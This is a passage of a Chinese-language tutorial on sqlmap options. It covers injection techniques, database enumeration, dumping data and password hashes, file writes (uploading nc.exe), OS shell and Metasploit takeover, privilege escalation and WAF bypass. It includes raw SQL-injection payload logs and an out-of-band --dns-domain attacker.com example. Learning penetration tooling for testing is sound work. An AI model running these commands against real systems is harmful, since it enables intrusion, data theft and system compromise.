[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
[...]
[hh:mm:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause
'
[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONC
AT(cHar(58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/
**/elsE/**/0/**/ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/info
rmation_schema.tables/**/group/**/bY/**/x)a)
[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or
 HAVING clause' injectable 
[...]
```



# 5. 检测

> 本部分主要包含
>
> 1. 设置sqlmap的检测的等级
> 2. 风险的等级设置
> 3. sqlmap对于注入前后页面的对比

## --levels

> 用来定义 检测等级的, 等级越高, 难度越大, 检测的也越详细



## --risk

> 用来指定检测的风险程度, 一共三个风险级别
>
> 1. **级别1** : 几乎没有任何风险
> 2. **级别2** : 在默认的检测上添加大量的**时间盲注**
> 3. **级别3** : 在原基础上添加 **or类型的布尔盲注**



##  页面对比

````
--string               # 该字符串支出现在 true页面上.
--regexp               # 通过正则匹配, 指定的字符串支出项在true页面上.
--not-string           # 该字符串出现在false页面上. 
--code                  # 返回的页面包含 指定的转态码(例如: 200)的时候, 返回True 
--text-only             # 返回的页面包含指定的 字符串的时候返回True
--titles                # 返回的页面包含指定的title的时候返回True
````



# 技术(各种类型的注入)

> 本部分主要是对**各种类型的注入**相关的参数进行介绍. 主要包括
>
> 1. 时间盲注
> 2. 联合查询注入
> 3. 二阶注入

## --technique

> sqlmap默认情况下会使用所有类型的 `sql注入` , 如果指向测试某种需要的注入类型可以通过改参数指定, 比如:
>
> B : 布尔型盲注
>
> E : 报错型注入
>
> U : 联合查询注入
>
> S : 堆查注入
>
> T : 时间型盲注
>
> Q : 内联查询注入

```
# 例如:我们要测试 报错和堆查询注入, 则使用
ES

# 当访问Windows注册表配置单元时,又或者访问文件系统,
# 接管文件系统的时候必须指定   S 

```



## --time-sec

> 用于对 **时间盲注**设置响应的延迟时间, sqlmap默认的延时是` 5 秒`



## --union-cols

> 对于 **联合查询** 指定其注入的列数, 一般是10列, 通过调整`--levels`, 可以将查询列数增至  `50列` 以例如:
>
> `12-16` 表示 **进行从12到16列的联合查询测试**



## --union-char

> 在使用联合查询的时候, 会有 NUll(sqlmap默认使用这个)失败, 而使用随机数的时候成功的情况, 可以通过改参数进行配置.

```
--union char 123            
```



## --union-from 

> 在联合查询中有些数据库必须知道有些表才能进行查询. 
>
> 通过改参数来指定表名, 例如: `--union-from = users`





## --dns-domain

> 在使用者已经控制了一条注册了dns的主机的时候, 可以用这个参数进行dns攻击. 假如主机的域名为 `atacker.com` , 那么可以这样:`--dns-domain attacker.com` .
>
> **注意:**
>
> 1. 我们需要管理员权限才能运行, 因为需要 **特权端口 53**
> 2. **报错注入** 或者 **联合查询注入**  在默认情况下会**自动跳出dns攻击**
> 3. 最好是 **时间盲注** , 这样测试的效率会高很多



## --second-order

> 用于 **二阶攻击**, 也就是 `payload注入后, 注入的结果会显示在另一个页面中` , 通过搭配显示url地址来测试此类sql注入. 



## 指纹识别

> sqlmap会自动进行数据库的指纹识别. 

```
-f
-b 或者--banner 
```



# 枚举(列出数据库信息)

> 本分主要主要通过参数枚举**数据库的一些信息**
>
> 

## --all

> 发起大量的请求, 获得所有可访问的信息. 
>
> **本参数不建议使用, 因为获得的信息很多是没用的**



## --banner 或者 -b

> 改参数可以获得数据库的版本信息

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int.php?id=1" -\
-banner
```



## --current-user

> 作用: 获取当前**正在**执行相关数据库查询操作的DBMS用户



## --current-db

> 获取正在连接的数据库的名称



## --hostname

> 获取 **数据库所在的主机名**.
>
> ```
> $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --\
> hostname
> ```



## --is-dba

> 获取当前当前数据库是否为管理员. 使得返回 `True`, 不是的返回`False`



## --users

> 在得到数据库的读(写)权限的**前提下**, 列出用户列表



## --passwords

> 在得到数据库的读(写)权限的**前提下**, 列出每个数据库存储的用户的密码哈希值. 

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
passwords -v 1
```



## -U

> 用于指定 要枚举的**用户**



## --privileges

> 在得到数据库的读(写)权限的**前提下**, 列出所有用户的权限



## --roles

> 在得到数据库的读(写)权限的**前提下** , 枚举出每个用户的角色



## --dbs

> 列举出所有的数据库



## tables相关参数

> 在得到数据库的读(写)权限的**前提下** , 列出数据库的数据表.

```
--tables                  # 列出数据库表
--exclude-sysdbs          # 排除所有的系统数据库
-D                        # 列出指定数据库的数据表. 如果不指定将列出所有数据库的数据表.

# 对于Oracle, 我们需要提供tablespace_name   , 而不是数据库名称
```



## col相关参数

> 在得到数据库的读(写)权限的**前提下** , 列出数据表的列名

```
--columns           # 枚举出数据表的列名
-C                  # 和 --columns一样的, 只是一个简写
-T                  # 指定表名 
-D                  # 指定数据库, 不指定将列出所有的数据库

注意: 
对于PostgreSQL数据库,  使用者必须提供public或者系统数据库名
```

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" -\
-columns -D testdb -T users -C name
```



## 列出数据库表, 库等完整的信息

```
--schema             
--exclude-sysdbs       # 包含非系统数据库模式时列出数据
```

```
$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --s\
chema--batch --exclude-sysdbs
```



## --count

> 列出数据表的条目数 , 将会显示出所有的数据表和对应的条目数

```
$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"\
 --count -D testdb
```



## 列举数据表库条目

> 在获取到**读**的权限下, 得到数据表的条目信息.

```
--dump
-C                     # 指定要导出的列名, 用 逗号分隔
-T
-d 

--start              # 通过start 和 stop 来指定导出的列的范围
--stop
										--stop 1             导出第一条目录
										--stop 3             导出第三条目录

--first             # 指定导出条目的字符范围   , 仅适用于盲注技术.
--last
									--first 3 --last 5         导出第三到第五个字符
									

--pivot-column         # 通过主键导出 列
                  --pivot-column = id
                  
--where                # 列出给定条件的列  , 例如: 导出id>3的列
                   --where="id>3"
                   
```



## --dump-all 

> 导出所有数据表的条目,结合 `--exclude-sysdbs`  , 导出非系统数据库

**注意**: 

Microsoft SQL Server，`master` 数据库不被视为系统数据库，因为某些数据库管理员将其用作用户数据库。



## --search 

> 结合 `-C , -T 或者 -D`等参数, 搜素数据库, 数据表等



## 执行自定义sql语句

```
--sql-query
--sql-shell                   # 如同接连接到 DBMS 的 SQL 控制台, 正常操作.
```

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --\
sql-query "SELECT 'foo'" -v 1
```

**注意:**   有些系统支持堆叠查询, 有些不支持. 

​			

# 特殊情况

> 出现一下是那种情况, `--tables ` 和 `--columns`不能用了, 
>
> - DBMS 是 **< 5.0** 版本的 MySQL，它们不具备 `information_schema`。
> - DBMS 是微软的 Access 数据库，并且其中的系统表 `MSysObjects` 默认设置不可读。
> - 当前会话用户对 DBMS 中存储数据表定义的系统表没有读权限
>
> 所以用 `--common-tables`  和 `--common-columns`暴力破解 表 和 列 . 



## 自定义函数注入

```
--udf-inject
--shared-lib
```

[点击查看: 参考](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857)



# 针对文件系统操作

> 针对的数据库如下:
>
> 1. MySQL
> 2. PostgreSQL
> 3. Microsoft SQL Server

```
# 读取数据库文件系统
--file-read

# 向文件系统写入内容
--file-write

# 向文件系统上传文件
--file-dest
```

```
# 网上的例子:
$ file /software/nc.exe.packed 
/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32
-bit

$ ls -l /software/nc.exe.packed
-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed

$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" -\
-file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
```



# 接管操作系统

> **要求的数据类型:** 这是**前提!!!!!!!!!!!**
>
>  **MySQL，PostgreSQL 或  Microsoft SQL Server**

## --os-cmd 和 --os-shell

> 给控制的操作系统进行一些终端操作的, 相当于与后渗透. 
>
> sqlmap支持的后门类型:
>
> - ASP
> - ASP.NET
> - JSP
> - PHP

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
os-cmd id -v 1
```



## 外带到其他工具

> sqlmap能够通过建立 **TCP连接** ,是允许有外带的. 可以外带到 **交互命令行, Meterper 会话 或者 VNC会话**

```
--os-pwn
--os-smbrelay
--os-bog
--priv-esc
--msf-path
--tmp-path
```

[点击进入: 参考1](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857)

[点击进入: 参考2](http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database)

```
# 网上的例子:
通过 sqlmap 的用户自定义函数 sys_bineval() 在数据库内存中执行 Metasploit shellcode。MySQL 和 PostgreSQL 支持该技术，通过开关 --os-pwn 启用。
通过 sqlmap 的用户自定义函数 sys_exec() 向 MySQL 和 PostgreSQL 上传一个 Metasploit 独立 payload 传输器并执行，对于 Microsoft SQL Server 则是使用 xp_cmdshell() 函数，通过开关 --os-pwn 启用。
通过进行从数据库服务器到攻击者机器（由 Metasploit smb_relay 服务监听）之间的 UNC 路径请求的 SMB 反射攻击（MS08-068）来执行 Metasploit shellcode。当 sqlmap 运行于具有高权限（uid=0）的 Linux/Unix 上，且目标 DBMS 以 Windows 管理员身份运行时支持该技术，通过开关 --os-smbrelay 启用。
通过利用 Microsoft SQL Server 2000 和 2005 的 sp_replwritetovarbin 存储过程堆缓冲区溢出（MS09-004）在数据库内存中执行 Metasploit shellcode。sqlmap 使用自己的 exploit，自动绕过 DEP 内存保护来触发漏洞，但它依赖 Metasploit 生成 shellcode，以便在成功利用时执行，通过开关 --os-bof 启用。

$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\
id=1" --os-pwn --msf-path /software/metasploit
```

**注意:**

后渗透的时候, **要十分注意权限!!!**, 使用 sqlmap 的 `--priv-esc` 开关，可以通过 Metasploit `getsystem` 命令进行**数据库进程用户提权**



# 对Windows注册表的一些操作

> MySQL，PostgreSQL 或 Microsoft SQL Server 并且 Web 应用程序支持堆查询时, 可以尝试进行如下操作:

```
# 读取Windows注册表的键值
--reg-read

# 写入Windows注册表的键值
--reg-add

# 删除Windows注册表项
--reg-del

#================下面是对上面参数的辅助选项================

--reg-key               # 指定Windows注册表的路径

--reg-value             # 提供注册表项的名称

--reg-data              # 提供注册表的键值数据

--reg-type              # 指定注册表的键值类型

```

```
# 范例如下:
$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --r\
eg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-ty\
pe=REG_SZ --reg-data=1
```



# 常用项

## -s

> 作用: 从一个存储文件中下载 `session`数据, 这个存储文件很可能是 `.sqlite`



## -t

> 将HTTP(s) 流量写入到 text 文件中

## --batch

> 实现sqlmap自动化, 不需要人为的回答问题.

## wers

> 在使用了` --batch`参数的情况下, sqlmap会自动回答问题. 
>
> 但是有部分问题, 我们想自己回答, 此时就用  `--answers`进行指定. 
>
> 可以用 **逗号(,)**来分隔多个指定的问题的内容. 

```
$ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--te\
chnique=E --answers="extending=N" --batch

[xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you 
want to skip test payloads specific for other DBMSes? [Y/n] Y
[xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provide
d level (1) and risk (1)? [Y/n] N
```



## --base64

> 有些网站是用base64加密存储数据的, 所以我们需要对于请求的参数进行base64加密处理. 

```
python sqlmap.py -u http://192.168.22.128/sqlmap/mysql/get_base64?value=eyJpZC\
I6IDF9 -v 5 --base64=value
```



## --binary-fields

> 对于拿到的二进制的值, 将对其破解. 但是sqlmap破解出来的是16进制的形式. 所以此时需要用到其他工具 例如:john



## --charset 

> 对于布尔盲注和时间盲注, 我们可用这个参数来指定使用的字符集, 以便于提高效率.  例如:  
>
> ```
> `charset = "0123456789abcdef"`  自定义字符集使用0 ~ 9 , 以及字母 a到f.
> --charset=utf8：使用UTF-8字符集。
> --charset=utf8mb4：使用UTF-8MB4字符集。
> --charset=gbk：使用GBK字符集。
> --charset=latin1：使用Latin1字符集。
> --charset=utf16le：使用UTF-16 Little Endian字符集。
> --charset=utf16be：使用UTF-16 Big Endian字符集。
> ```



## --crawl

> 对指定的网站进行爬虫. 当爬取到新的连接的时候, 就会递归式的对爬取的新的页面再次深层爬取



## --crawl-exclude

> 爬取的时候排除一些页面, 例如:
>
> 不想爬取含有`logout`关键字的网页, 可以用`--crawl-exclude=logout`



## --dump-format

> 指定输出的形式, 可以是 CSV, HTML , SQLITE , 默认输出形式是 CSV



## --csv-del

> 在数据输出到csv文件中的时候, 指定分隔符,
>
> 例如: 人为指定用 分号(;) 对输出的条目进行分隔, 那就用
>
> `--csv-del=";"`



## --dbms-cred

> 针对于访问数据库权限不足而是用该参数



## --encoding

> 指定HTTP等服务器提供的信息的编码方式:
>
> ```
> --encoding=utf-8：使用UTF-8编码。
> --encoding=utf-16le：使用UTF-16 Little Endian编码。
> --encoding=utf-16be：使用UTF-16 Big Endian编码。
> --encoding=gbk：使用GBK编码。
> --encoding=big5：使用Big5编码。
> ```



## --eta

> 展示查询的进度的.



## --flush-session

> 对会话进行更新, sqlmap将会删除所有的缓存.



## --forms

> 对于在含有 `form`表单的网页, 我们可以用这个参数来进行检测. 



## --fresh-queries

> 在十分的了解sqlmap的会话的时候, 但我们不像看到黑窗口中的输出结果的时候, 就用这个参数. 



## --hex

> 对发起的内容进行 十六进制编码. 



## --output-dir

> 自定义输出文件的存储位置, 例如: `--out-dir=/tmp`



## --save 

> 也是定义文件路径, 只是没有 上面的`--out-dir`详细,  `--save`只会保存结果, 是 单个文件. 



## --parse-errors

> 通过该参数, sqlmap会自动的对报的错进行解析. 并且打印再黑窗口上.



## --preprocess

> 对发起的请求之前, 进行的操作, 需要自定义:
>
> ```
> #!/usr/bin/env python
> 
> def preprocess(req):
>     if req.data:
>         req.data += b'&foo=bar'
> ```



# --postprocess

> 在sqlmap执行完以后进行后续的操作. 

```
#!/usr/bin/env python

def postprocess(page, headers=None, code=None):
    return page.upper() if page else page, headers, code
    # 将拿到的页面数据进行小写转为大写. 
```



# 杂项

## -z

> 在**没有类似的参数**情况下, 我们可以通过这个参数实现, 只输入我们想要使用的参数的开头的几个字母, 便可以正常的执行命令. 

例如:

```
# 原本需要输入的命令: 
$ python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testd\
b -T users -u "www.target.com/vuln.php?id=1"

# 用  -z  简化的后:
$ python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.\
com/vuln.php?id=1"
```



## --alert

> 当sql 注入成功的时候, 会进行报警



## --beep

> 当发现有sql注入的时候,  会**发出  嘟** 的 声响, 用来警报法向sql注入点



## --cleanup

> 在利用sqlmap进行后渗透的时候, 我们需要清楚sqlmap创建的临时的表单 . 



## --dependencies

> 用来检测sqlmap 缺少的第三方依赖库



## --disable-coloring

> 关闭彩色输出



## -gpage

> 改参数与 `-g`联合使用, 只多功能Google search 的搜索结果, 这样就可以不止搜索 100条了



## --hpp

> HTTP parameter pollution , 用来污染(绕过)waf的, 对于 **ASP , IIS 和 ASP.NET/IIS**很有效. 



## --skip-waf

> 用来绕过waf的.  当然, 也可以自定义 `--tamper`, 但是`--tamper`只是局部的, 而 `--skip-waf`是全局的进行绕过. 



## --mobile

> 有些时候, 一些网站向手机发送的请求中, **暴露的接口比电脑端要多**, 通过这个参数sqlmap可以模拟一些手机, 淡然, 这个是需要自己选的, 根据提示进行操作就好. 



## --offline

> 进入离线模式, 此时sqlmap不会对目标进行连接, 也就是断网状态, 而sqlmap使用的数据也是之前的 session 



## --purge

> 安全移除所有建立的连接,  删除本地sqlmaps数据的目录和历史记录, 并且 **随机覆盖数据, 防止数据的恢复**

## --smart

> 为了尽快找到可能的漏洞, 只对 **数据库报错的参数进行扫描 , 其他的直接跳过**



## --test -filter

> 用来检测含有 使用者指定**关键字**(或者是 **标题**)的 payload, 例如:
>
> ```
> # 对 row 关键字的payload进行测试
> 
> --test-filter=row
> ```



## --test-skip=TEST

> 对一些 含有**指定关键字或者标题**的payload不进行检测. 

```
# 对含有 benchmark 的payload不检测

--test-skip= benchmark
```



## --shell

> 实现shell交互. 包括之前使用过的选项.

```
$ python sqlmap.py --shell
```



## --wizard

> 这个是一个非常人性化的参数, **对初学者非常友好**. 
>
> `在仅输出url 以及使用 sqlmap默认回答下` , 使用该参数, 在运行的每一步都会有提示选项. Nice!!!!!!!!!!



# API(REST-JSON)

```
# 查看api相关命令 
python sqlmapapi.py -hh


-s         # 运行 sqlmapapi.py 来启动服务器
-c         # 启动额客户端
-H         # 指定监听的ip , 默认ip为 127.0.0.1
-p         # 指定监听的端口  , 默认port为 8775

```

```
# 客户端的命令
help                   # 显示可用的命令列表和基本帮助信息
new ARGS               # 使用提供参数, 开始一次新的扫描,  例如: new -u "网址"
use TASKId             # 切换当前上下文到不同任务（例如：use c04d8c5c7582efb4）
data                   # 获取并显示当前人物数据
log                    # 获取当前任务日志
status                 # 获取当前任务状态
stop                   # 停止当前任务
kill                   # 杀死当前任务
list                   # 列出所有的任务
flush                  # 清空所有的任务
exit                   # 退出客户端界面
```

